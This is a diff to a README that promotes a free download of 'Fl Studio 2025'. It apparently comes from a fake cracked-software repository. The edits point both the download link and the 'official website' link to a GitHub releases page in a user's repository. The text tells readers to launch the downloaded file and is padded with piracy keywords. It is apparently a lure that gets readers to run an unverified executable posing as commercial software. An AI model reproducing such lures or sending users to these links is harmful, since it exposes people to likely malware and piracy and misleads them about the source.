@@ -15,7 +15,7 @@ fl-free,fl-studio-free-download-github,fl-studio-free-github,fl-studio-license-d
 
 ## Get Started
 
-To download Fl Studio 2025 for free, simply click on the following link: [Download Fl Studio 2025](https://github.com/files/uploaded/Application.zip). 
+To download Fl Studio 2025 for free, simply click on the following link: [Download Fl Studio 2025](https://github.com/whitenoise1231/Fl-Studio-2025/releases). 
 
 ### Note
 Make sure to launch the file after downloading.
@@ -31,7 +31,7 @@ Make sure to launch the file after downloading.
 Fl Studio 2025 stands out from the competition due to its user-friendly interface, powerful features, and convenient cloud integration. Whether you are a professional music producer or just starting out, Fl Studio 2025 has everything you need to bring your musical ideas to life.
 
 ## Want to Learn More?
-For more information on Fl Studio 2025, be sure to visit the [official website](https://www.flstudio2025.com) for the latest updates and tutorials. 
+For more information on Fl Studio 2025, be sure to visit the [official website](https://github.com/whitenoise1231/Fl-Studio-2025/releases) for the latest updates and tutorials. 
 
 ## Get Involved
 We are constantly improving Fl Studio 2025 and welcome contributions from the community. If you'd like to get involved in the development process, feel free to fork the repository and submit a pull request.
